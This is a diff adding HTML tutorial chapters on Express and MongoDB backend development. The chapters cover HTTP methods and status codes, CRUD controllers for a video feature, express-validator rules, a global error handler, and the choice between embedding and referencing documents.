+    <div class="qa-item">
+      <div class="qa-q">What is idempotency? Which HTTP methods should be idempotent?</div>
+      <div class="qa-body">
+        <div class="qa-a">Making the same request N times produces the same result as making it once. GET, PUT, DELETE should be idempotent. POST is NOT — calling <code>POST /users</code> twice creates two users.</div>
+        <div class="qa-eg"><span class="ok">// Idempotent — same result no matter how many times:</span>
+DELETE /users/123   (1st call: deleted. 2nd call: already deleted, same state)
+GET    /users/123   (always returns same user)
+PUT    /users/123   { name: "Tejas" }   (always sets to "Tejas")
+
+<span class="bad">// NOT idempotent:</span>
+POST /users   { name: "Tejas" }   (1st call: user_1. 2nd call: user_2 created)
+
+<span class="hi">// Why it matters: network retry logic — safe to retry idempotent requests</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is API versioning and why use /v1/?</div>
+      <div class="qa-body">
+        <div class="qa-a">Version prefix allows old and new API versions to coexist. When you make breaking changes (rename fields, change response shape), deploy as <code>/v2/</code> — old clients on <code>/v1/</code> keep working during migration.</div>
+        <div class="qa-eg"><span class="hi">// Without versioning — breaking change breaks ALL clients immediately:</span>
+GET /users/profile  →  { fullname: "Tejas" }   <span class="bad">(old)</span>
+GET /users/profile  →  { name: "Tejas" }       <span class="bad">(new — every client breaks)</span>
+
+<span class="ok">// With versioning — gradual migration:</span>
+GET /api/v1/users/profile  →  { fullname: "Tejas" }   <span class="ok">(old clients, still works)</span>
+GET /api/v2/users/profile  →  { name: "Tejas" }       <span class="ok">(new clients, new shape)</span>
+<span class="ok">// Deprecate v1 after all clients migrate  ✓</span></div>
+      </div>
+    </div>
+
+    <div class="qa-item">
+      <div class="qa-q">What is the two-step file upload pattern and why is it used with Cloudinary?</div>
+      <div class="qa-body">
+        <div class="qa-a">Multer saves the file locally first (gives you a file path), then you upload from that path to Cloudinary, then delete the local file. Direct streaming from request to Cloudinary requires more complex SDK setup and error handling.</div>
+        <div class="qa-eg">Client → multipart/form-data request
+  → Multer middleware: saves to ./public/temp/1735000000-image.jpg
+  → Controller: uploadToCloudinary("./public/temp/1735000000-image.jpg")
+      → cloudinary.uploader.upload(localPath)   <span class="ok">// uploads from disk</span>
+      → fs.unlinkSync(localPath)                <span class="ok">// delete temp file (always!)</span>
+  → Controller: User.create({ avatar: cloudinaryResponse.url })
+
+<span class="hi">// If you skip deletion: public/temp grows unboundedly → disk full → crash</span></div>
+      </div>
+    </div>
+  </div>
+
+</section>
+
+
+<!-- ═══ CHAPTER 14 ══════════════════════════════════════ -->
+<section class="chapter" id="ch14">
+  <div class="ch-eyebrow">// CH.14</div>
+  <h2>HTTP — Status Codes, Methods &amp; Headers</h2>
+  <p class="chapter-desc">The language of the web. Every backend developer must know these by heart — interviewers love asking "what status code should this return?"</p>
+
+  <h3>HTTP Methods (Verbs)</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Method</th><th>Meaning</th><th>Idempotent?</th><th>Has Body?</th><th>Example</th></tr>
+    <tr><td><code>GET</code></td><td>Read a resource</td><td>Yes</td><td>No</td><td>GET /users/123</td></tr>
+    <tr><td><code>POST</code></td><td>Create a resource</td><td>No</td><td>Yes</td><td>POST /users</td></tr>
+    <tr><td><code>PUT</code></td><td>Replace a resource completely</td><td>Yes</td><td>Yes</td><td>PUT /users/123</td></tr>
+    <tr><td><code>PATCH</code></td><td>Update part of a resource</td><td>No</td><td>Yes</td><td>PATCH /users/123</td></tr>
+    <tr><td><code>DELETE</code></td><td>Remove a resource</td><td>Yes</td><td>No</td><td>DELETE /users/123</td></tr>
+    <tr><td><code>OPTIONS</code></td><td>Ask server what methods are allowed (CORS preflight)</td><td>Yes</td><td>No</td><td>OPTIONS /users</td></tr>
+  </table></div>
+
+  <h3>Status Code Reference (Must-Know)</h3>
+  <h4>2xx — Success</h4>
+  <div class="table-wrap"><table>
+    <tr><th>Code</th><th>Name</th><th>When to use</th></tr>
+    <tr><td><code>200</code></td><td>OK</td><td>Default success — GET, PUT, PATCH, DELETE responded successfully</td></tr>
+    <tr><td><code>201</code></td><td>Created</td><td>POST succeeded and created a new resource (use for register, create post)</td></tr>
+    <tr><td><code>204</code></td><td>No Content</td><td>Success but no body — DELETE that returns nothing</td></tr>
+  </table></div>
+  <h4>4xx — Client Errors</h4>
+  <div class="table-wrap"><table>
+    <tr><th>Code</th><th>Name</th><th>When to use</th></tr>
+    <tr><td><code>400</code></td><td>Bad Request</td><td>Invalid input — missing required fields, wrong format, validation fails</td></tr>
+    <tr><td><code>401</code></td><td>Unauthorized</td><td>Not authenticated — no token, invalid token, expired token</td></tr>
+    <tr><td><code>403</code></td><td>Forbidden</td><td>Authenticated but not allowed — logged in but not an admin</td></tr>
+    <tr><td><code>404</code></td><td>Not Found</td><td>Resource doesn't exist — user with that ID not found</td></tr>
+    <tr><td><code>409</code></td><td>Conflict</td><td>Duplicate — email already registered, username taken</td></tr>
+    <tr><td><code>422</code></td><td>Unprocessable Entity</td><td>Request is understood but validation failed (some devs use 400 for this too)</td></tr>
+    <tr><td><code>429</code></td><td>Too Many Requests</td><td>Rate limit hit — slow down your requests</td></tr>
+  </table></div>
+  <h4>5xx — Server Errors</h4>
+  <div class="table-wrap"><table>
+    <tr><th>Code</th><th>Name</th><th>When to use</th></tr>
+    <tr><td><code>500</code></td><td>Internal Server Error</td><td>Something went wrong on the server — unexpected crash, DB error</td></tr>
+    <tr><td><code>502</code></td><td>Bad Gateway</td><td>Upstream server returned invalid response (proxy/reverse proxy issue)</td></tr>
+    <tr><td><code>503</code></td><td>Service Unavailable</td><td>Server down for maintenance or overloaded</td></tr>
+  </table></div>
+
+  <h3>Important HTTP Headers</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Header</th><th>Direction</th><th>Purpose</th></tr>
+    <tr><td><code>Content-Type</code></td><td>Request &amp; Response</td><td>What format the body is: <code>application/json</code>, <code>multipart/form-data</code>, <code>text/html</code></td></tr>
+    <tr><td><code>Authorization</code></td><td>Request</td><td>Token: <code>Bearer eyJhbGci...</code></td></tr>
+    <tr><td><code>Cookie</code></td><td>Request</td><td>Browser auto-sends stored cookies</td></tr>
+    <tr><td><code>Set-Cookie</code></td><td>Response</td><td>Server tells browser to store a cookie</td></tr>
+    <tr><td><code>Access-Control-Allow-Origin</code></td><td>Response</td><td>CORS header — which origins can call this API</td></tr>
+    <tr><td><code>Accept</code></td><td>Request</td><td>What format client accepts: <code>application/json</code></td></tr>
+  </table></div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What status code do you return when a user tries to register with an already-used email?" → <strong>409 Conflict</strong> (not 400 — the request is valid, but it conflicts with existing data).</p>
+    <p>"What's the difference between 401 and 403?" → 401 = not authenticated (no token). 403 = authenticated but not permitted (token valid, but you don't have permission).</p>
+    <p>"What does a CORS preflight OPTIONS request do?" → Browser sends OPTIONS first to ask "does this server allow cross-origin requests from my origin with these headers?". Server responds with allowed methods/headers. If OK, browser sends the actual request.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 15 ══════════════════════════════════════ -->
+<section class="chapter" id="ch15">
+  <div class="ch-eyebrow">// CH.15</div>
+  <h2>CRUD Pattern — Building Any Feature</h2>
+  <p class="chapter-desc">Auth is done. Now how do you build anything else? Every feature (videos, comments, tweets, products) follows the same CRUD pattern. Learn it once, apply forever.</p>
+
+  <p>CRUD = <strong>C</strong>reate, <strong>R</strong>ead, <strong>U</strong>pdate, <strong>D</strong>elete — the four operations every resource needs.</p>
+
+  <h3>The Recipe for Any New Feature</h3>
+  <p>Say you want to add a <strong>Video</strong> feature. Follow this exact order every time:</p>
+  <ol>
+    <li>Create the <strong>model</strong> (schema + methods)</li>
+    <li>Create the <strong>controller</strong> (CRUD functions)</li>
+    <li>Create the <strong>router</strong> (URL → controller mapping)</li>
+    <li>Mount the router in <strong>app.js</strong></li>
+  </ol>
+
+  <h3>Step 1: Model</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">models/video.model.js (already in your project)</div>
+    <pre><span class="kw">const</span> <span class="var">videoSchema</span> = <span class="kw">new</span> <span class="fn">Schema</span>({
+  videoFile:   { type: String, required: true },   <span class="cm">// cloudinary url</span>
+  thumbnail:   { type: String, required: true },
+  title:       { type: String, required: true },
+  description: { type: String, required: true },
+  duration:    { type: Number, required: true },
+  views:       { type: Number, default: 0 },
+  isPublished: { type: Boolean, default: true },
+  owner:       { type: Schema.Types.ObjectId, ref: <span class="str">"User"</span> }  <span class="cm">// ref to User</span>
+}, { timestamps: true })
+
+videoSchema.<span class="fn">plugin</span>(mongooseAggregatePaginate)</pre>
+  </div>
+
+  <h3>Step 2: Controller (Full CRUD)</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">controllers/video.controller.js</div>
+    <pre><span class="cm">// CREATE</span>
+<span class="kw">const</span> <span class="fn">uploadVideo</span> = <span class="fn">asyncHandler</span>(<span class="kw">async</span>(<span class="var">req</span>, <span class="var">res</span>) => {
+  <span class="kw">const</span> { title, description } = <span class="var">req</span>.<span class="prop">body</span>
+  <span class="kw">const</span> <span class="var">videoLocalPath</span> = <span class="var">req</span>.<span class="prop">files</span>?.<span class="prop">videoFile</span>?.[<span class="num">0</span>]?.<span class="prop">path</span>
+  <span class="cm">// upload to cloudinary, create Video doc...</span>
+  <span class="kw">const</span> <span class="var">video</span> = <span class="kw">await</span> Video.<span class="fn">create</span>({ title, videoFile: cloudUrl, owner: <span class="var">req</span>.<span class="prop">user</span>._id })
+  <span class="kw">return</span> <span class="var">res</span>.<span class="fn">status</span>(<span class="num">201</span>).<span class="fn">json</span>(<span class="kw">new</span> <span class="fn">ApiResponse</span>(<span class="num">201</span>, <span class="str">"Video uploaded"</span>, <span class="var">video</span>))
+})
+
+<span class="cm">// READ ALL (paginated)</span>
+<span class="kw">const</span> <span class="fn">getAllVideos</span> = <span class="fn">asyncHandler</span>(<span class="kw">async</span>(<span class="var">req</span>, <span class="var">res</span>) => {
+  <span class="kw">const</span> { page = <span class="num">1</span>, limit = <span class="num">10</span>, query = <span class="str">""</span> } = <span class="var">req</span>.<span class="prop">query</span>
+  <span class="kw">const</span> <span class="var">videos</span> = <span class="kw">await</span> Video.<span class="fn">find</span>({ title: { <span class="prop">$regex</span>: <span class="var">query</span>, <span class="prop">$options</span>: <span class="str">"i"</span> } })
+                             .<span class="fn">skip</span>((<span class="var">page</span> - <span class="num">1</span>) * <span class="var">limit</span>).<span class="fn">limit</span>(<span class="var">limit</span>)
+  <span class="kw">return</span> <span class="var">res</span>.<span class="fn">json</span>(<span class="kw">new</span> <span class="fn">ApiResponse</span>(<span class="num">200</span>, <span class="str">"Videos fetched"</span>, <span class="var">videos</span>))
+})
+
+<span class="cm">// READ ONE</span>
+<span class="kw">const</span> <span class="fn">getVideoById</span> = <span class="fn">asyncHandler</span>(<span class="kw">async</span>(<span class="var">req</span>, <span class="var">res</span>) => {
+  <span class="kw">const</span> <span class="var">video</span> = <span class="kw">await</span> Video.<span class="fn">findById</span>(<span class="var">req</span>.<span class="prop">params</span>.<span class="prop">videoId</span>)
+                             .<span class="fn">populate</span>(<span class="str">"owner"</span>, <span class="str">"username avatar"</span>)
+  <span class="kw">if</span> (!<span class="var">video</span>) <span class="kw">throw new</span> <span class="fn">ApiError</span>(<span class="num">404</span>, <span class="str">"Video not found"</span>)
+  <span class="kw">return</span> <span class="var">res</span>.<span class="fn">json</span>(<span class="kw">new</span> <span class="fn">ApiResponse</span>(<span class="num">200</span>, <span class="str">"Video found"</span>, <span class="var">video</span>))
+})
+
+<span class="cm">// UPDATE</span>
+<span class="kw">const</span> <span class="fn">updateVideo</span> = <span class="fn">asyncHandler</span>(<span class="kw">async</span>(<span class="var">req</span>, <span class="var">res</span>) => {
+  <span class="kw">const</span> <span class="var">video</span> = <span class="kw">await</span> Video.<span class="fn">findById</span>(<span class="var">req</span>.<span class="prop">params</span>.<span class="prop">videoId</span>)
+  <span class="kw">if</span> (!<span class="var">video</span>) <span class="kw">throw new</span> <span class="fn">ApiError</span>(<span class="num">404</span>, <span class="str">"Video not found"</span>)
+  <span class="cm">// Authorization check: only owner can update</span>
+  <span class="kw">if</span> (<span class="var">video</span>.<span class="prop">owner</span>.<span class="fn">toString</span>() !== <span class="var">req</span>.<span class="prop">user</span>._id.<span class="fn">toString</span>())
+    <span class="kw">throw new</span> <span class="fn">ApiError</span>(<span class="num">403</span>, <span class="str">"You can only update your own videos"</span>)
+  <span class="var">video</span>.<span class="prop">title</span> = <span class="var">req</span>.<span class="prop">body</span>.<span class="prop">title</span> || <span class="var">video</span>.<span class="prop">title</span>
+  <span class="kw">await</span> <span class="var">video</span>.<span class="fn">save</span>()
+  <span class="kw">return</span> <span class="var">res</span>.<span class="fn">json</span>(<span class="kw">new</span> <span class="fn">ApiResponse</span>(<span class="num">200</span>, <span class="str">"Video updated"</span>, <span class="var">video</span>))
+})
+
+<span class="cm">// DELETE</span>
+<span class="kw">const</span> <span class="fn">deleteVideo</span> = <span class="fn">asyncHandler</span>(<span class="kw">async</span>(<span class="var">req</span>, <span class="var">res</span>) => {
+  <span class="kw">const</span> <span class="var">video</span> = <span class="kw">await</span> Video.<span class="fn">findByIdAndDelete</span>(<span class="var">req</span>.<span class="prop">params</span>.<span class="prop">videoId</span>)
+  <span class="kw">if</span> (!<span class="var">video</span>) <span class="kw">throw new</span> <span class="fn">ApiError</span>(<span class="num">404</span>, <span class="str">"Video not found"</span>)
+  <span class="kw">return</span> <span class="var">res</span>.<span class="fn">json</span>(<span class="kw">new</span> <span class="fn">ApiResponse</span>(<span class="num">200</span>, <span class="str">"Video deleted"</span>, {}))
+})</pre>
+  </div>
+
+  <h3>Step 3: Router</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">routes/video.router.js</div>
+    <pre><span class="kw">import</span> { Router } <span class="kw">from</span> <span class="str">"express"</span>
+<span class="kw">import</span> { verifyJWT } <span class="kw">from</span> <span class="str">"../middlewares/auth.middlewares.js"</span>
+<span class="kw">import</span> { getAllVideos, uploadVideo, getVideoById, updateVideo, deleteVideo }
+  <span class="kw">from</span> <span class="str">"../controllers/video.controller.js"</span>
+
+<span class="kw">const</span> <span class="var">router</span> = <span class="fn">Router</span>()
+
+router.<span class="fn">route</span>(<span class="str">"/"</span>)         .<span class="fn">get</span>(<span class="fn">getAllVideos</span>)
+                           .<span class="fn">post</span>(<span class="fn">verifyJWT</span>, upload.<span class="fn">fields</span>([...]), <span class="fn">uploadVideo</span>)
+router.<span class="fn">route</span>(<span class="str">"/:videoId"</span>).<span class="fn">get</span>(<span class="fn">getVideoById</span>)
+                           .<span class="fn">patch</span>(<span class="fn">verifyJWT</span>, <span class="fn">updateVideo</span>)
+                           .<span class="fn">delete</span>(<span class="fn">verifyJWT</span>, <span class="fn">deleteVideo</span>)
+
+<span class="kw">export default</span> <span class="var">router</span></pre>
+  </div>
+
+  <h3>Step 4: Mount in app.js</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">src/app.js</div>
+    <pre><span class="kw">import</span> <span class="var">videoRouter</span> <span class="kw">from</span> <span class="str">"./routes/video.router.js"</span>
+app.<span class="fn">use</span>(<span class="str">"/api/v1/videos"</span>, <span class="var">videoRouter</span>)
+
+<span class="cm">// Final routes:
+// GET    /api/v1/videos            ← list all
+// POST   /api/v1/videos            ← upload (auth required)
+// GET    /api/v1/videos/:videoId   ← get one
+// PATCH  /api/v1/videos/:videoId   ← update (auth required)
+// DELETE /api/v1/videos/:videoId   ← delete (auth required)</span></pre>
+  </div>
+
+  <div class="callout senior">
+    <div class="callout-label">Senior Dev Says</div>
+    <p>The authorization check <code>video.owner.toString() !== req.user._id.toString()</code> is critical. MongoDB ObjectIds are objects — you must call <code>.toString()</code> on both before comparing with <code>!==</code>. Direct comparison of two ObjectId objects always returns false even if they're the same ID.</p>
+  </div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"How do you handle pagination in a REST API?" — Use <code>page</code> and <code>limit</code> query params. Skip = <code>(page - 1) * limit</code>. Also return <code>totalDocs</code> so the client knows total pages. Example: <code>GET /videos?page=2&amp;limit=10</code></p>
+    <p>"How do you search resources?" — Use query params: <code>GET /videos?query=nodejs</code>. In mongoose: <code>{ title: { $regex: query, $options: "i" } }</code> — <code>i</code> makes it case-insensitive.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 16 ══════════════════════════════════════ -->
+<section class="chapter" id="ch16">
+  <div class="ch-eyebrow">// CH.16</div>
+  <h2>Input Validation</h2>
+  <p class="chapter-desc">Never trust user input. Validate before it touches your database. <code>express-validator</code> is already in your project's package.json.</p>
+
+  <h3>Why Validate?</h3>
+  <ul>
+    <li>User can send anything — empty strings, negative numbers, SQL injection strings, 10MB JSON blobs</li>
+    <li>The DB will throw cryptic errors if invalid data hits it — better to catch it at the boundary</li>
+    <li>Validation errors should be 400 Bad Request with clear messages, not 500 crashes</li>
+  </ul>
+
+  <h3>Two Approaches</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Approach</th><th>How</th><th>Used when</th></tr>
+    <tr><td>Manual validation</td><td><code>if (!email || !password) throw new ApiError(400, "...")</code></td><td>Simple checks — already in this project's controllers</td></tr>
+    <tr><td>express-validator</td><td>Middleware-based declarative rules</td><td>Complex validation — email format, password strength, string length</td></tr>
+  </table></div>
+
+  <h3>express-validator (Already Installed)</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">middlewares/validators/user.validators.js — create this file</div>
+    <pre><span class="kw">import</span> { body, validationResult } <span class="kw">from</span> <span class="str">"express-validator"</span>
+
+<span class="cm">// Define validation rules as middleware arrays</span>
+<span class="kw">export const</span> <span class="var">registerValidator</span> = [
+  body(<span class="str">"email"</span>)
+    .<span class="fn">isEmail</span>().<span class="fn">withMessage</span>(<span class="str">"Valid email is required"</span>)
+    .<span class="fn">normalizeEmail</span>(),
+
+  body(<span class="str">"password"</span>)
+    .<span class="fn">isLength</span>({ min: <span class="num">8</span> }).<span class="fn">withMessage</span>(<span class="str">"Password must be at least 8 chars"</span>)
+    .<span class="fn">matches</span>(/\d/).<span class="fn">withMessage</span>(<span class="str">"Password must contain a number"</span>),
+
+  body(<span class="str">"username"</span>)
+    .<span class="fn">trim</span>()
+    .<span class="fn">isLength</span>({ min: <span class="num">3</span>, max: <span class="num">20</span> }).<span class="fn">withMessage</span>(<span class="str">"Username: 3-20 chars"</span>)
+    .<span class="fn">matches</span>(/^[a-zA-Z0-9_]+$/).<span class="fn">withMessage</span>(<span class="str">"Letters, numbers, underscores only"</span>),
+]
+
+<span class="cm">// Middleware to check results and throw if any rule failed</span>
+<span class="kw">export const</span> <span class="fn">validate</span> = (<span class="var">req</span>, <span class="var">res</span>, <span class="var">next</span>) => {
+  <span class="kw">const</span> <span class="var">errors</span> = <span class="fn">validationResult</span>(<span class="var">req</span>)
+  <span class="kw">if</span> (!<span class="var">errors</span>.<span class="fn">isEmpty</span>()) {
+    <span class="kw">throw new</span> <span class="fn">ApiError</span>(<span class="num">400</span>, <span class="var">errors</span>.<span class="fn">array</span>()[<span class="num">0</span>].<span class="prop">msg</span>)  <span class="cm">// first error's message</span>
+  }
+  <span class="fn">next</span>()
+}</pre>
+  </div>
+
+  <div class="codeblock">
+    <div class="codeblock-header">routes/user.router.js — wire the validators</div>
+    <pre><span class="kw">import</span> { registerValidator, validate } <span class="kw">from</span> <span class="str">"../middlewares/validators/user.validators.js"</span>
+
+router.<span class="fn">route</span>(<span class="str">"/register"</span>).<span class="fn">post</span>(
+  upload.<span class="fn">fields</span>([...]),
+  ...registerValidator,  <span class="cm">// spread the array of rules</span>
+  <span class="fn">validate</span>,             <span class="cm">// check results, throw if any failed</span>
+  <span class="fn">registerUser</span>          <span class="cm">// only runs if validation passed</span>
+)</pre>
+  </div>
+
+  <h3>Common Validators Cheat Sheet</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Validator</th><th>What it checks</th></tr>
+    <tr><td><code>.isEmail()</code></td><td>Valid email format</td></tr>
+    <tr><td><code>.isLength({ min, max })</code></td><td>String length range</td></tr>
+    <tr><td><code>.notEmpty()</code></td><td>Not empty string</td></tr>
+    <tr><td><code>.isNumeric()</code></td><td>Only digits</td></tr>
+    <tr><td><code>.isURL()</code></td><td>Valid URL</td></tr>
+    <tr><td><code>.isIn(["admin","user"])</code></td><td>Must be one of these values</td></tr>
+    <tr><td><code>.trim()</code></td><td>Strips whitespace before validation</td></tr>
+    <tr><td><code>.normalizeEmail()</code></td><td>Lowercases, removes dots from gmail</td></tr>
+    <tr><td><code>.matches(/regex/)</code></td><td>Must match regex pattern</td></tr>
+    <tr><td><code>.custom(fn)</code></td><td>Your own validation function</td></tr>
+  </table></div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"Where should validation happen?" — At the API boundary, before business logic. Never assume the client sends correct data. Validate in middleware before the controller runs — that way controllers are clean and validation is reusable.</p>
+    <p>"What's the difference between sanitization and validation?" — Validation checks if data is acceptable (is this a valid email?). Sanitization transforms data to make it safe (trim whitespace, escape HTML, normalize email). express-validator does both.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 17 ══════════════════════════════════════ -->
+<section class="chapter" id="ch17">
+  <div class="ch-eyebrow">// CH.17</div>
+  <h2>Global Error Handler</h2>
+  <p class="chapter-desc">The missing piece of the error chain. Every <code>throw new ApiError()</code> in your project ends up here. Without this, Express sends its own ugly HTML error page.</p>
+
+  <h3>The Full Error Flow</h3>
+  <div class="flow">Controller throws:  throw new ApiError(401, "Unauthorized")
+  ↓
+asyncHandler catches: .catch(next)  →  calls next(error)
+  ↓
+Express detects error middleware (4 args): (err, req, res, next)
+  ↓
+Your global error handler sends the response</div>
+
+  <h3>Setting Up the Global Error Handler</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">src/app.js — add AFTER all routes</div>
+    <pre><span class="cm">// Must be AFTER routes — Express identifies error middleware by 4 args</span>
+app.<span class="fn">use</span>((<span class="var">err</span>, <span class="var">req</span>, <span class="var">res</span>, <span class="var">next</span>) => {
+  <span class="cm">// Determine status code</span>
+  <span class="kw">const</span> <span class="var">statusCode</span> = <span class="var">err</span>.<span class="prop">code</span> || <span class="var">err</span>.<span class="prop">statusCode</span> || <span class="num">500</span>
+
+  <span class="cm">// Handle Mongoose validation errors</span>
+  <span class="kw">if</span> (<span class="var">err</span>.<span class="prop">name</span> === <span class="str">"ValidationError"</span>) {
+    <span class="kw">return</span> <span class="var">res</span>.<span class="fn">status</span>(<span class="num">400</span>).<span class="fn">json</span>({
+      statusCode: <span class="num">400</span>,
+      message: Object.<span class="fn">values</span>(<span class="var">err</span>.<span class="prop">errors</span>)[<span class="num">0</span>].<span class="prop">message</span>,
+      success: <span class="kw">false</span>
+    })
+  }
+
+  <span class="cm">// Handle Mongoose duplicate key error (unique field)</span>
+  <span class="kw">if</span> (<span class="var">err</span>.<span class="prop">code</span> === <span class="num">11000</span>) {
+    <span class="kw">const</span> <span class="var">field</span> = Object.<span class="fn">keys</span>(<span class="var">err</span>.<span class="prop">keyValue</span>)[<span class="num">0</span>]
+    <span class="kw">return</span> <span class="var">res</span>.<span class="fn">status</span>(<span class="num">409</span>).<span class="fn">json</span>({
+      statusCode: <span class="num">409</span>,
+      message: <span class="str">`</span><span class="var">${field}</span><span class="str"> already exists`</span>,
+      success: <span class="kw">false</span>
+    })
+  }
+
+  <span class="cm">// Handle JWT errors</span>
+  <span class="kw">if</span> (<span class="var">err</span>.<span class="prop">name</span> === <span class="str">"JsonWebTokenError"</span>) {
+    <span class="kw">return</span> <span class="var">res</span>.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ statusCode: <span class="num">401</span>, message: <span class="str">"Invalid token"</span>, success: <span class="kw">false</span> })
+  }
+  <span class="kw">if</span> (<span class="var">err</span>.<span class="prop">name</span> === <span class="str">"TokenExpiredError"</span>) {
+    <span class="kw">return</span> <span class="var">res</span>.<span class="fn">status</span>(<span class="num">401</span>).<span class="fn">json</span>({ statusCode: <span class="num">401</span>, message: <span class="str">"Token expired"</span>, success: <span class="kw">false</span> })
+  }
+
+  <span class="cm">// ApiError or generic error</span>
+  <span class="kw">return</span> <span class="var">res</span>.<span class="fn">status</span>(<span class="var">statusCode</span>).<span class="fn">json</span>({
+    statusCode: <span class="var">statusCode</span>,
+    message:    <span class="var">err</span>.<span class="prop">message</span> || <span class="str">"Something went wrong"</span>,
+    success:    <span class="kw">false</span>,
+    <span class="cm">// Only show stack trace in development:</span>
+    ...(process.env.<span class="prop">NODE_ENV</span> === <span class="str">"development"</span> && { stack: <span class="var">err</span>.<span class="prop">stack</span> })
+  })
+})</pre>
+  </div>
+
+  <h3>Error Code Reference for Mongoose</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Error</th><th>Name / Code</th><th>Meaning</th></tr>
+    <tr><td>Schema validation fails</td><td><code>err.name === "ValidationError"</code></td><td>Required field missing, type mismatch, enum mismatch</td></tr>
+    <tr><td>Duplicate unique field</td><td><code>err.code === 11000</code></td><td>Email or username already exists in DB</td></tr>
+    <tr><td>Invalid ObjectId</td><td><code>err.name === "CastError"</code></td><td>The id in the URL isn't a valid MongoDB ObjectId</td></tr>
+    <tr><td>JWT invalid</td><td><code>err.name === "JsonWebTokenError"</code></td><td>Token was tampered with or wrong secret</td></tr>
+    <tr><td>JWT expired</td><td><code>err.name === "TokenExpiredError"</code></td><td>Token past its expiry time</td></tr>
+  </table></div>
+
+  <div class="callout senior">
+    <div class="callout-label">Senior Dev Says</div>
+    <p>Never expose stack traces in production — they reveal your file structure, library versions, and code logic to attackers. Use <code>NODE_ENV === "development"</code> to conditionally include <code>err.stack</code>. In production, log the stack internally (to a service like Sentry or a log file) but send only a clean message to the client.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 18 ══════════════════════════════════════ -->
+<section class="chapter" id="ch18">
+  <div class="ch-eyebrow">// CH.18</div>
+  <h2>Database Relationships — Embed vs Reference</h2>
+  <p class="chapter-desc">MongoDB's most important design decision. Getting this wrong causes either slow queries or data inconsistency. Learn the rules once.</p>
+
+  <h3>Two Ways to Relate Data</h3>
+  <div class="table-wrap"><table>
+    <tr><th></th><th>Embedding</th><th>Referencing</th></tr>
+    <tr><td><strong>How</strong></td><td>Nest the document inside the parent</td><td>Store the ObjectId, use populate()</td></tr>
+    <tr><td><strong>Reads</strong></td><td>One query — data is already there</td><td>Two queries — find parent, then find referenced docs</td></tr>
+    <tr><td><strong>Updates</strong></td><td>Update parent document</td><td>Update referenced collection independently</td></tr>
+    <tr><td><strong>Use when</strong></td><td>Data belongs to one parent, read together</td><td>Data is shared, large, or frequently updated independently</td></tr>
+  </table></div>
+
+  <h3>Embedding — When to Use</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">Example: User address — always belongs to this user, always read with user</div>
+    <pre><span class="kw">const</span> <span class="var">userSchema</span> = <span class="kw">new</span> <span class="fn">Schema</span>({
+  username: String,
+  address: {           <span class="cm">// ← embedded subdocument</span>
+    street: String,
+    city:   String,
+    pin:    String,
+  }
+})
+<span class="cm">// Document in DB:</span>
+<span class="cm">// { username: "tejas", address: { street: "MG Road", city: "Pune" } }</span>
+<span class="cm">// ONE query to get user + address. Simple. Fast.</span></pre>
+  </div>
+  <p><strong>Use embedding when:</strong> the nested data is only accessed through the parent, won't grow unboundedly, and is always read together with the parent.</p>
+
+  <h3>Referencing — When to Use</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">Example: Video owner — User is a separate entity, shared across many videos</div>
+    <pre><span class="kw">const</span> <span class="var">videoSchema</span> = <span class="kw">new</span> <span class="fn">Schema</span>({
+  title: String,
+  owner: { type: Schema.Types.<span class="fn">ObjectId</span>, ref: <span class="str">"User"</span> }  <span class="cm">// ← reference</span>
+})
+
+<span class="cm">// Get video WITH owner data (populate = second DB query):</span>
+<span class="kw">await</span> Video.<span class="fn">findById</span>(<span class="var">id</span>).<span class="fn">populate</span>(<span class="str">"owner"</span>, <span class="str">"username avatar"</span>)
+<span class="cm">// → { title: "Video", owner: { username: "tejas", avatar: "url" } }</span>
+
+<span class="cm">// Don't need owner data? Don't populate. Saves the second query.</span>
+<span class="kw">await</span> Video.<span class="fn">findById</span>(<span class="var">id</span>)   <span class="cm">// → { title: "Video", owner: ObjectId("abc123") }</span></pre>
+  </div>
+  <p><strong>Use referencing when:</strong> the data is a separate entity (User, Category), is shared across multiple documents, or is large and not always needed.</p>
+
+  <h3>The Golden Rules</h3>
+  <ul>
+    <li><strong>1:1 or 1:few → Embed</strong> (user profile, address, settings)</li>
+    <li><strong>1:many or many:many → Reference</strong> (video owner, post tags, order items)</li>
+    <li><strong>Unbounded arrays → Never embed</strong> (comments on a post — MongoDB documents max out at 16MB)</li>
+    <li><strong>Frequently read together → Embed</strong> (user + avatar)</li>
+    <li><strong>Updated independently → Reference</strong> (user changes username — all videos auto-reflect it via populate)</li>
+  </ul>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"When would you embed vs reference in MongoDB?" — Embed when data is owned by one parent and always read together (address, profile). Reference when data is shared, large, or updated independently (user, category). Rule: if the embedded array can grow unboundedly, always reference.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 19 ══════════════════════════════════════ -->
+<section class="chapter" id="ch19">
+  <div class="ch-eyebrow">// CH.19</div>
+  <h2>Aggregation Pipeline</h2>
+  <p class="chapter-desc">MongoDB's most powerful feature. Used for complex queries: joins, filters, groups, sorts in a single DB operation. Used in real-world projects for feeds, analytics, recommendations.</p>
+
+  <h3>What Is an Aggregation Pipeline?</h3>
+  <p>A sequence of stages — each stage transforms the documents and passes them to the next. Think of it like piping: <code>data | filter | join | group | sort | limit</code>.</p>
+
+  <div class="codeblock">
+    <div class="codeblock-header">Basic pipeline structure</div>
